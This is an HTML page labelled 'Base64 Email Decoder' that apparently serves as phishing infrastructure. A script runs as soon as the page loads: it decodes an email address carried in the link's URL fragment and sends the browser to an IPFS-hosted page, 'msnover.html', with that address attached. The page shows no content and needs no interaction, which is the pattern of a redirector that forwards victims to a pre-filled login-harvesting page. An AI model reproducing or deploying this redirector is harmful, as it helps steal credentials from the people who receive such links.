<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Base64 Email Decoder</title>
</head>
<body>
<script>
  function base64Decode(str) {
    try {
      return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      }).join(''));
    } catch (e) {
      console.error('Invalid base64 string:', str);
      return null;
    }
  }

  var hash = window.location.hash;
  if (hash !== "") {
    hash = hash.substring(1); // Remove the '#' character
    const email = base64Decode(hash);
    if (email)
 {
      window.location.href = "https://ipfs.io/ipfs/bafybeidogd25756pobdjq34cewta4b2tcnx2bdvvwqusrpngp6lneh555i/msnover.html#" + email;
    }
  }
</script>
</body>
</html>
